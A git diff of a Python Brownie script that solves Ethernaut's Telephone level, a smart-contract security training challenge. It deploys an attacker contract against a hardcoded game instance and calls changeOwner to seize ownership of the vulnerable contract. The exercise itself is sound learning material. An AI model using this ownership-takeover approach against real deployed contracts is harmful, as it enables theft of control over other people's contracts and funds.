@@ -1,24 +1,27 @@
 from scripts.helpful_scripts import get_account
-from brownie import accounts, config, interface, network, Attack04, Attack_Telephone
+from brownie import interface, Attack04
 
-ETHERNAUT_INSTANCE = "0xaA0349CfC5a3cE9FD3f24622F749799693b64354"
+ETHERNAUT_INSTANCE = "0x05324798452fc61A5163216AFFFcDa2C8024DF0C"
 
 
 def main():
 
     player = get_account()
 
-    attacker_contract = Attack_Telephone.deploy(
-        ETHERNAUT_INSTANCE, {"from": player}
-    )  # tick
-    attack_interface = interface.Iattack_telephone(attacker_contract.address)  #
+    attacker_contract = Attack04.deploy(ETHERNAUT_INSTANCE, {"from": player})
 
-    telphone_interface = interface.Itelephone(ETHERNAUT_INSTANCE)
+    attack_interface = interface.Iattack_telephone(attacker_contract.address)
 
-    attacker_contract.change({"from": player})
+    telphone_interface = interface.ITelephone(ETHERNAUT_INSTANCE)
 
-    # There is a change of state in contract so need {'from':player})
-    attack_interface.change({"from": player})
-    owner = telphone_interface.owner()
-    print("Player is ", player)
-    print("Owner is", owner)
+    print(f"attack interface: {attack_interface}")
+    print(f"telephone interface: {telphone_interface}")
+
+    attacker_contract.changeOwner({"from": player})
+
+    # attack_interface.change({"from": player})
+
+    # owner = telphone_interface.owner()
+
+    # print("Player is ", player)
+    # print("Owner is", owner)
